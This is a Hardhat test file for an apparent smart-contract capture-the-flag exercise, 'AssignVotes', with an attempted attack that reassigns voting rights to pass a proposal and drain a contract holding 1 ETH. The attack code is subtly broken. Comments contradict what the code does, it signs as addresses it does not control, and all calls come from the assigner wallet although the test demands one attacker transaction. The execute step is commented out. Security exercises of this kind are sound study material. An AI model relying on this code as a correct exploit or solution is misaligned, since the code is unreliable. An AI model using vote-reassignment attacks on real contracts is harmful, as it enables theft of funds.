const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "AssignVotes";

describe(NAME, function () {
  async function setup() {
    const [owner, assignerWallet, attackerWallet] = await ethers.getSigners();

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy({
      value: ethers.utils.parseEther("1"),
    });

    return { victimContract, assignerWallet, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, assignerWallet, attackerWallet;
    before(async function () {
      ({ victimContract, assignerWallet, attackerWallet } = await loadFixture(
        setup
      ));
      await victimContract
        .connect(assignerWallet)
        .assign("0x976EA74026E726554dB657fA54763abd0C3a0aa9");
      await victimContract
        .connect(assignerWallet)
        .assign("0x14dC79964da2C08b23698B3D3cc7Ca32193d9955");
      await victimContract
        .connect(assignerWallet)
        .assign("0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f");
      await victimContract
        .connect(assignerWallet)
        .assign("0xa0Ee7A142d267C1f36714E4a8F75612F20a79720");
      await victimContract
        .connect(assignerWallet)
        .assign("0xBcd4042DE499D14e55001CcbB24a551F3b954096");
      await victimContract
        .connect(assignerWallet)
        .assign("0x71bE63f3384f5fb98995898A86B02Fb2426c5788");
    });

    it("conduct your attack here", async function () {
      const proposalId = 0; // Assuming this is the first and only proposal

      // Initially assigned addresses
      const initiallyAssigned = [
        "0x976EA74026E726554dB657fA54763abd0C3a0aa9",
        "0x14dC79964da2C08b23698B3D3cc7Ca32193d9955",
        "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f",
        "0xa0Ee7A142d267C1f36714E4a8F75612F20a79720",
        "0xBcd4042DE499D14e55001CcbB24a551F3b954096",
        "0x71bE63f3384f5fb98995898A86B02Fb2426c5788",
      ];

      // Additional addresses for voting to reach 10 votes
      const additionalVoters = [
        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",
        "0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B",
        "0x4Fabb145d64652a948d72533023f6E7A623C7C53",
        "0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB",
      ];

      const otherAddresses = [
        // 5 random addresses 
        "0x617F2E2fD72FD9D5503197092aC168c91465E7f2",
        "0x17F6AD8Ef982297579C203069C1DbfFE4348c372",
        "0x5c6B0f7Bf3E7ce046039Bd8FABdfD3f9F5021678",
        "0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7",
        "0x1aE0EA34a72D944a8C7603FfB3eC30a6669E454C",
      ]; 

      // Have initially assigned addresses vote
      for (const address of initiallyAssigned) {
        const voterSigner = await ethers.getSigner(address);
        await victimContract.connect(voterSigner).vote(proposalId);
      }

      // Sequentially reassign votes and have additional addresses vote
      for (const address of additionalVoters) {
        // Use the first address from initiallyAssigned for reassignment
        await victimContract.connect(assignerWallet).removeAssignment(otherAddresses[0]);
        await victimContract.connect(assignerWallet).assign(address);
      
        const voterSigner = await ethers.getSigner(address);
        await victimContract.connect(voterSigner).vote(proposalId);

        // Rotate the initiallyAssigned array to use a different address for the next reassignment
        initiallyAssigned.push(initiallyAssigned.shift());
      }
      // // Execute the proposal
      // await victimContract.connect(assignerWallet).execute(proposalId);
    });



    after(async function () {
      expect(
        await ethers.provider.getBalance(victimContract.address)
      ).to.be.equal(0);
      expect(
        await ethers.provider.getTransactionCount(attackerWallet.address)
      ).to.equal(1, "must exploit one transaction");
    });
  });
});
